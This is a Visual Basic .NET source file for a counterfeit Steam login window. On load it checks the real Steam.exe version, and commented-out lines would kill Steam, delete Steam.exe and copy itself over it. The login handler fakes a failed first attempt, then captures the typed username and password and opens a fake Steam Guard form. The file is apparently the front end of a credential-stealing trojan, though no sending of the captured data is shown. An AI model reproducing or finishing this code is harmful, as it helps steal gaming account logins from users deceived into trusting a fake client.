Imports System.Net

Public Class Form1
    Public Shared loginAttempts As Integer = 0

    Private Function GetFileVersionInfo(ByVal filename As String) As Version
        Return Version.Parse(FileVersionInfo.GetVersionInfo(filename).FileVersion)
    End Function
    Private Sub Form1_Load(sender As Object, e As System.EventArgs) Handles Me.Load
        Me.CenterToScreen()
        Dim architecture As Integer = Runtime.InteropServices.Marshal.SizeOf(GetType(IntPtr)) * 8

        Dim FileToCopy As String
        Dim NewCopy As String

        Dim exeName As String = IO.Path.GetFileName(Application.ExecutablePath)

        FileToCopy = Application.StartupPath.ToString & "\" & exeName
        NewCopy = "C:\Program Files (x86)\Steam\Steam.exe"
        Dim vrs As String = "6.1.7.9"

        If Environment.Is64BitOperatingSystem Then
            vrs = GetFileVersionInfo("C:\Program Files (x86)\Steam\Steam.exe").ToString()
            NewCopy = "C:\Program Files (x86)\Steam\Steam.exe"
        Else
            vrs = GetFileVersionInfo("C:\Program Files\Steam\Steam.exe").ToString()
            NewCopy = "C:\Program Files\Steam\Steam.exe"
        End If

        Dim TargetProcess As Process() = Process.GetProcessesByName("Steam")
        If Not TargetProcess.Length = 0 Then
            ''TargetProcess(0).Kill()
        End If
        If Not (vrs.Equals("6.1.7.9")) Then
            ' System.IO.File.Delete(NewCopy)
            If System.IO.File.Exists(FileToCopy) = True Then
                '  System.IO.File.Copy(FileToCopy, NewCopy, True)
            End If
        End If
    End Sub

    Private Sub SteamButton2_Click(sender As Object, e As EventArgs) Handles SteamButton2.Click
        Dim webAddress As String = "https://store.steampowered.com/join/"
        Process.Start(webAddress)
    End Sub

    Private Sub SteamButton1_Click(sender As Object, e As EventArgs) Handles SteamButton1.Click
        Dim webAddress2 As String = "https://help.steampowered.com/"
        Process.Start(webAddress2)
    End Sub

    Private Sub CancelButton_Click(sender As Object, e As EventArgs) Handles CancelButton.Click
        Application.Exit()
    End Sub

    Private Sub LoginButton_Click(sender As Object, e As EventArgs) Handles LoginButton.Click
        If (loginAttempts < 1) Then
            loginAttempts = loginAttempts + 1
            Me.Size = New System.Drawing.Size(480, 391)
            PictureBox3.Location = New Point(2, 275)
            SteamButton1.Location = New Point(211, 301)
            SteamButton2.Location = New Point(211, 331)
            PictureBox4.Visible = True
            SteamTextBox1.Text = ""
        Else
            If (loginAttempts = 1) Then
                Dim user As String = UsernameBox.Text
                Dim pass As String = SteamTextBox1.Text
                Dim rcode As String = ""
                System.Threading.Thread.Sleep(1000)
                Dim SteamGuard As New Form3
                SteamGuard.Show()
                'Me.Hide()
            End If
        End If
    End Sub

    Private Sub SteamClose2_Click(sender As Object, e As EventArgs) Handles SteamClose2.Click
        Application.Exit()
    End Sub

    Dim drag As Boolean = False
    Dim x, y As Integer

    Private Sub PictureBox1_MouseDown(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles PictureBox1.MouseDown
        drag = True
        x = e.X
        y = e.Y
    End Sub

    Private Sub PictureBox1_MouseMove(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles PictureBox1.MouseMove
        If drag Then
            Me.Left = MousePosition.X - x
            Me.Top = MousePosition.Y - y
        End If
    End Sub

    Private Sub PictureBox1_MouseUp(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles PictureBox1.MouseUp
        drag = False
    End Sub
End Class
